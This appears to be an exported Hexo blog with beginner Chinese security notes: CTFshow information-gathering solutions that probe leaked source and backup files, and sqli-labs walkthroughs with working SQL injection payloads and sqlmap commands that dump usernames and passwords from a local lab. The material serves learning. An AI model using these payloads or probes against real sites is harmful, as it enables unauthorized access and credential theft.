<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>利用漏洞获取一定的服务器权限就是getshell，如果是web漏洞就叫webshell，还有别的shell，ftp、sql、3899、4899等等，一般来说这个shell权限很低，需要提权后才能获取服务器的管理员权限。<br>ms10002漏洞可以通过winxp的IE浏览器GetShell；</p>
<p>详细内容参考该文：<a href="https://blog.csdn.net/m0_64378913/article/details/124752200">XSS漏洞利用案例</a></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zhuanlan.zhihu.com/p/463346634#:~:text=%E4%BB%8E0%E5%88%B01%E5%AD%A6%E4%B9%A0XSS%EF%BC%88%E6%9C%80%E5%85%A8%E6%9C%80%E7%BB%86%E8%87%B4%E7%9A%84%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%EF%BC%89%201%201%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B%20%28%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96%29%20%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E5%8F%88%E7%A7%B0%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8Bxss%EF%BC%8C%E6%98%AF%E7%9B%AE%E5%89%8D%E6%9C%80%E6%99%AE%E9%81%8D%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%BE%80%E5%BE%80%E5%85%B7%E6%9C%89%E4%B8%80%E6%AC%A1%E6%80%A7%E3%80%82%20%E5%8F%91%E5%87%BA%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E5%87%BA%E7%8E%B0%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%8F%90%E4%BA%A4%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E5%93%8D%E5%BA%94%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E9%9A%8F%E5%93%8D%E5%BA%94%E5%86%85%E5%AE%B9%E4%B8%80%E8%B5%B7%E4%BC%A0%E5%9B%9E%E7%BB%99%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E6%9C%80%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8CXSS%E4%BB%A3%E7%A0%81%E3%80%82%20...,1%E3%80%8B%204%203%E3%80%81%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%9B%E9%94%8B%E7%9C%9F%E4%BA%BACS%E9%87%8E%E6%88%98123%20%EF%BC%881%EF%BC%89%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD%20%E9%93%BE%E6%8E%A5%EF%BC%9A%20pan.baidu.com%2Fs%2F1YUKC5I%20%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Artra%20">从0到1学习XSS</a></p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW_WEB入门_信息搜集</title>
    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仍然是新手入门题，继续来训练自己的基础了。这一篇主要是训练的信息搜集部分。有些相似的内容在攻防世界新手篇中有的不会再写，选择性的写有遗漏的部分。</p>
<span id="more"></span>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p><strong>考点: 前台JS绕过</strong><br>这一题无法鼠标右键查看源代码，也无法按下F12。<br>题目明示了是js前端拦截，那么我们有三种方法：</p>
<ol>
<li><p>不断刷新，不断按F12<br>实际上是一种条件竞争的方式</p>
</li>
<li><p>view-source:url<br>在url之前加上view-source</p>
</li>
<li><p>下载源码，比如按下CTRL+S<br>下载后即可查看</p>
</li>
</ol>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><strong>考点: phps源码泄露</strong><br>提示源码泄露<br>直接在url后面加上<br><code>/index.phps</code><br>然后弹出下载框，下载后打开，发现flag</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><strong>考点: 源码压缩包泄露</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网站备份压缩文件 漏洞成因</span><br><span class="line">在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。</span><br><span class="line">当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</span><br><span class="line">该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。</span><br><span class="line">该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。</span><br><span class="line">被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</span><br><span class="line">.rar .zip .7z .tar.gz .bak .swp .txt</span><br></pre></td></tr></table></figure>
<p>提示解压源码到当前目录。<br>一番折腾后，终于搞清楚做法：<br><code>url/www.zip</code><br>下载后解压打开txt文件，拿到flag</p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><strong>考点: Git泄露</strong><br>题目描述： 版本控制很重要，但不要部署到生产环境更重要。<br>根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag<br>这里是 .git 源码泄露。<br>是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。<br>访问 <code>url/.git/</code><br>得到flag</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><strong>考点: SVN泄露</strong><br>与web7类似，<br>这里是 SVN 导致文件泄露。<br>Subversion ，简称 SVN ，是一个开放源代码的版本控制系统，它的设计目标是取代 CVS 。<br>访问 <code>url/.svn</code><br>得到flag</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><strong>考点: vim临时文件泄露</strong><br>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了<br>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn<br><a href="https://www.runoob.com/linux/linux-vim.html">vim</a></p>
<p>因此，访问 <code>url/index.php.swp</code><br>得到flag</p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p><strong>考点: 域名txt记录泄露</strong><br>题目描述：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息<br>根据提示，我们可以去查找该域名，比如打开<a href="https://boce.aliyun.com/home">网络诊断分析</a><br>查找后在“DNS检查”下发现TXT，得到flag</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><strong>考点: 敏感信息公布</strong><br>题目描述：有时候网站上的公开信息，就是管理员常用密码<br>打开页面，发现最底部的一串数字，根据提示，估计就是密码了。<br>然后在url后面添加admin： <code>url/admin</code><br>进入管理员后台账户，账号即为admin，密码是刚才那串数字。<br>得到flag</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><strong>考点: 内部技术文档泄露</strong><br>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br>查看底部的 document<br>点击后会出现一个pdf文件，上面写着登录地址和账号密码。<br>打开后即可得到flag</p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p><strong>考点: 编辑器配置不当</strong><br>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>首先根据提示，访问： <code>url/editor</code><br>这个界面具有编辑提交功能<br>我们点击图片上传或文件上传<br>可以看到目录，<br>查找 <code>/var/www/html/nothinghere/fl000g.txt</code><br>可以得到我们需要的文件，然后在url栏输入：<br><code>url/nothinghere/fl000g.txt</code><br>得到flag<br>这一题的关键在于没有经验很难找到关键文件，一般在www目录下会有关键信息。</p>
<h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p><strong>考点: 密码逻辑脆弱</strong><br>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>根据提示，拿到了公开的邮箱，<br>然后登录后台 <code>url/admin</code><br>随便输入一个密码无法登录，发现有个忘记密码选项，于是点击忘记密码，发现需要输入居住城市。于是我们想到了刚才那个邮箱，搜索QQ发现qq上的城市为西安，输入西安，密码重置。再次登录，获得flag<br>这一题提示我们要更灵活一点，善于利用信息！</p>
<h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p><strong>考点: 探针泄露</strong><br>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<ul>
<li>PHP探针:<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针。<br>根据探针的提示，我们可以访问： <code>url/tz.php</code><br>进入探针界面，然后发现界面有一个phpinfo，我们点进去，用CTRL+F，搜索ctf，找到flag</li>
</ul>
<h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p><strong>考点：sql备份文件泄露</strong><br>题目描述：备份的sql文件会泄露敏感信息<br>根据提示，我们访问： <code>url/backup.sql</code><br>弹出下载框，下载后打开，找到flag</p>
<h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p><strong>考点: js敏感信息泄露</strong><br>题目描述：不要着急，休息，休息一会儿，玩101分给你flag<br>直接打开F12，看到有一个js文件，我们直接加在url后面：<br><code>url/js/Flappy_js.js</code><br>打开后发现了一段unicode代码，我们解码成中文后，发现提示是110.php<br>于是将该php加在url后面：<br><code>url/110.php</code><br>得到flag</p>
<h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p><strong>考点: 前端密钥泄露</strong><br>题目描述：密钥什么的，就不要放在前端了<br>根据描述，发现前端验证，直接抓包，将验证内容输入到包里再发送<br>成功拿到flag</p>
<h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p><strong>考点: 数据库恶意下载</strong><br>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加 <code>/db/db.mdb</code> 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>得到flag</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>通过这次信息收集的训练，我又进步了一点点~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_46150940/article/details/113788511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-113788511-blog-116881655.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">CTFshow-Web入门-信息泄露</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>First Blog</title>
    <url>/2022/11/03/first_blog/</url>
    <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p>
<h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p>
<h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>

<h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p>
<h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol>
<li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li>
<li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li>
<li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li>
</ol>
<h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul>
<li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li>
<li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li>
<li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li>
<li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li>
<li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li>
<li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol>
<li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li>
<li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li>
<li>在我优化博客的时候有许多优质文章提供了帮助。</li>
</ol>
<p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p>
<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p>
<p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>搭建博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/11/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs_11+12</title>
    <url>/2022/11/10/sqli-labs_11+12/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始，使用POST提交方式，但只是换了种提交方式，模式和前面的GET还是差不多。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
<p>说明：这里的注释要使用#，之前的--+不再适用</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
<p>说明字段数为2</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第12关和第11关差不多，只是要用1”-or-1-x3D-1"><a href="#第12关和第11关差不多，只是要用1”-or-1-x3D-1" class="headerlink" title="第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #"></a>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果前面掌握了，这关没有难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqli-labs_1+2</title>
    <url>/2022/11/07/sqli-labs_1+2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>直接做题很痛苦，看不懂也没有基础。去补了一节课才明白很多原理。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li>
</ol>
<ul>
<li>有提示。则存在SQL注入</li>
<li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li>
</ul>
<ol start="2">
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure>
<p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
<p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()   		  MySQL版本</span><br><span class="line">user()     			  数据库用户名</span><br><span class="line">database() 			  数据库名</span><br><span class="line">@@datadir  			  数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p>
</li>
</ol>
<ul>
<li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure>
<p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p>
</li>
<li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure>
<p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure>
<p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p>
</li>
<li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p>
</li>
</ul>
<p>在本关中具体语句即为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p>
</li>
<li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="sqlmap方式"><a href="#sqlmap方式" class="headerlink" title="sqlmap方式"></a>sqlmap方式</h2><p>下面步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; --dbs   爆库</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() --tables   爆表</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users --columns   爆字段</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump  爆数据</span><br></pre></td></tr></table></figure>
<p>其余详参我的博客：sqlmap使用</p>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>以上示例主要是第一关，第一关和第二关差别只在字符型和数字型</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_13+14+15+16</title>
    <url>/2022/11/10/sqli-labs_13-16/</url>
